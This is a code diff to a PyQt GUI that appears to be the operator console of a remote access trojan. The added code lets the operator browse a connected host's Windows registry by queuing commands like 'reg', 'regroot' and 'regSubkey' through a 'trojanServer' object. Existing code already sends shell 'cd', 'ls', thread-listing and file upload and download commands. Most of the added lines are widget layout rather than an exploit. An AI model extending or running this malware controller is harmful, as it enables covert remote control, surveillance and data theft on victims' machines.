@@ -27,6 +27,10 @@ class DetailMain(QWidget, Ui_Form):
     pwdSignal = pyqtSignal(str)
     fileSignal = pyqtSignal(bytes)
     threadSignal = pyqtSignal(dict)
+    regsubdirSignal = pyqtSignal(dict)
+    regkeyvalueSignal = pyqtSignal(dict)
+    # regstartSignal = pyqtSignal()
+    pathSignal = pyqtSignal(str) # 其实是注册表的subkey
 
     def __init__(self, trojanserver=None, ck=0):
         super().__init__()
@@ -55,6 +59,11 @@ class DetailMain(QWidget, Ui_Form):
         self.listSignal.connect(self.displayList)
         self.listWidget.itemClicked.connect(self.enterDir)
         self.threadSignal.connect(self.displayThread)
+        self.regsubdirSignal.connect(self.displayregsubdir)
+        self.regkeyvalueSignal.connect(self.displayregkeyvalue)
+        self.Reglist.itemClicked.connect(self.enterSubkey)
+        self.KeyValuelist.itemClicked.connect(self.DetailedKey)
+        self.pathSignal.connect(self.displayregpath)
         self.Threadlist.itemClicked.connect(self.deletethread)
         self.freshlistbutton.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d ls"%self.ck))
         self.backbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd .." % self.ck))
@@ -68,6 +77,9 @@ class DetailMain(QWidget, Ui_Form):
         self.uploadbutton.clicked.connect(self.upload)
         self.fileSignal.connect(self.saveFile)
         self.startThreadctrl.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d thread" % self.ck))
+        self.startRegctrl.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d reg" % self.ck))
+        self.RegRoot.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d regroot" % self.ck))
+        self.RegBack.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d regback" % self.ck))
 
     def waitConnection(self):
         while True:
@@ -164,6 +176,21 @@ class DetailMain(QWidget, Ui_Form):
                         print(type(data))
                         self.threadSignal.emit(data)
                         #????self.threadSignal.emit()#
+
+                    # elif ty == 'regstart':
+                    #     res_len = struct.unpack('i', self.socket.recv(4))[0]
+                    #     response = self.tcpPieceRecv(res_len, self.socket, 1024)
+                    #     data = json.loads(response.decode('utf8'))
+                    #     self.regstartSignal.emit()
+
+                    elif ty == 'reglist':
+                        res_len = struct.unpack('i', self.socket.recv(4))[0]
+                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
+                        data = json.loads(response.decode('utf8'))
+                        print("receive reg list")
+                        self.regsubdirSignal.emit(data['data_reg_subdir'])
+                        self.regkeyvalueSignal.emit(data['data_reg_keyvalue'])
+                        self.pathSignal.emit(data['data_path'])
                     
                     elif ty == 'file':
                         size = struct.unpack('i', self.socket.recv(4))[0]
@@ -319,6 +346,141 @@ class DetailMain(QWidget, Ui_Form):
             self.Threadlist.addItem(item)
             widget = getThreadWin(f['Process name:'], f['PID:'],f['Parent:'],f['Parent pid:'])
             self.Threadlist.setItemWidget(item, widget)
+
+    def displayregsubdir(self, flist):
+        self.Reglist.clear()
+        def getRegSubdirWin(name):
+            widget = QWidget()
+            layout_main = QHBoxLayout()
+            widget.setLayout(layout_main)
+            icon = QLabel()
+            icon.setFixedSize(20, 20)
+            icon.setPixmap(QPixmap('pic/dir_icon.png').scaled(20, 20))
+
+            namelabel = QLabel()
+            namelabel.setText(name)
+
+            widget.namelabel = namelabel
+
+            layout_main.addWidget(icon)
+            layout_main.addWidget(namelabel)
+            return widget
+
+        for f in flist.values():
+            item = QListWidgetItem()
+            item.setSizeHint(QSize(150, 40))
+            self.Reglist.addItem(item)
+            widget = getRegSubdirWin(f)
+            self.Reglist.setItemWidget(item, widget)
+
+    def displayregkeyvalue(self, flist):
+        self.KeyValuelist.clear()
+
+        def getKeyValueWin(name, value, typeNo):
+            widget = QWidget()
+            layout_main = QHBoxLayout()
+            widget.setLayout(layout_main)
+            NameLabel = QLabel()
+            NameLabel.setFixedSize(700, 20)
+            NameLabel.setText(name)
+            ValueLabel = QLabel()
+            ValueLabel.setFixedSize(60, 20)
+            ValueLabel.setText(str(value))
+            typeNoLabel = QLabel()
+            typeNoLabel.setFixedSize(700, 20)
+            typeNoLabel.setText(str(typeNo))
+
+            widget.NameLabel = NameLabel
+            widget.ValueLabel = ValueLabel
+            widget.typeNoLabel = typeNoLabel
+
+            layout_main.addWidget(NameLabel)
+            layout_main.addWidget(ValueLabel)
+            layout_main.addWidget(typeNoLabel)
+            return widget
+
+        item = QListWidgetItem()
+        item.setSizeHint(QSize(800, 40))
+        self.KeyValuelist.addItem(item)
+        widget = QWidget()
+        layout_main = QHBoxLayout()
+        widget.setLayout(layout_main)
+        Name = QLabel()
+        Name.setFixedSize(700, 20)
+        Name.setText("Key Name")
+        pe = QPalette()
+        pe.setColor(QPalette.WindowText,Qt.red)
+        self.label.setAutoFillBackground(True)
+        pe.setColor(QPalette.Window,Qt.blue)
+        Name.setPalette(pe)
+        Value = QLabel()
+        Value.setFixedSize(60, 20)
+        Value.setText("Value")
+        Value.setPalette(pe)
+        TypeNo = QLabel()
+        TypeNo.setFixedSize(700, 20)
+        TypeNo.setText("TypeNo")
+        TypeNo.setPalette(pe)
+        widget.Name = Name
+        widget.Value = Value
+        widget.TypeNo = TypeNo
+
+        layout_main.addWidget(Name)
+        layout_main.addWidget(Value)
+        layout_main.addWidget(TypeNo)
+        self.KeyValuelist.setItemWidget(item, widget)
+        for f in flist.values():
+            item = QListWidgetItem()
+            item.setSizeHint(QSize(800, 40))
+            self.KeyValuelist.addItem(item)
+            widget = getKeyValueWin(f['name'], f['value'],f['typeNo'])
+            self.KeyValuelist.setItemWidget(item, widget)
+
+    def displayregpath(self, flist):
+        self.Regpath.clear()
+        def getRegPathWin(path):
+            widget = QWidget()
+            layout_main = QHBoxLayout()
+            widget.setLayout(layout_main)
+
+            pathlabel = QLabel()
+            pathlabel.setText(path)
+
+            widget.pathlabel = pathlabel
+
+            layout_main.addWidget(pathlabel)
+            return widget
+
+        item = QListWidgetItem()
+        # item.setSizeHint(QSize(130, 30))
+        # item.setSizeHint(QSize(100, 30))
+        item.setSizeHint(QSize(150, 40))
+        # item.setSizeHint(QSize(20, 20))
+        self.Regpath.addItem(item)
+        widget = getRegPathWin(flist)
+        self.Regpath.setItemWidget(item, widget)
+
+    def enterSubkey(self, item:QListWidgetItem = None):
+        widget = self.Reglist.itemWidget(item)
+        name = widget.namelabel.text()
+        self.trojanServer.cmdQ.put("msg %d regSubkey %s" %(self.ck, name))
+
+        # widget = self.listWidget.itemWidget(item)
+        # name = widget.namelabel.text()
+        # if widget.isDir:
+        #     self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
+        # else:
+        #     reply = QMessageBox.question(self, '提示', '下载%s?'%name,
+        #                                  QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+        #     if reply == QMessageBox.Yes:
+        #         self.trojanServer.cmdQ.put("msg %d getFile %s"%(self.ck, name))
+        #     else:
+        #         pass
+
+    def DetailedKey(self):
+        pass
+    
 
     def displayList(self, flist):
         self.listWidget.clear()
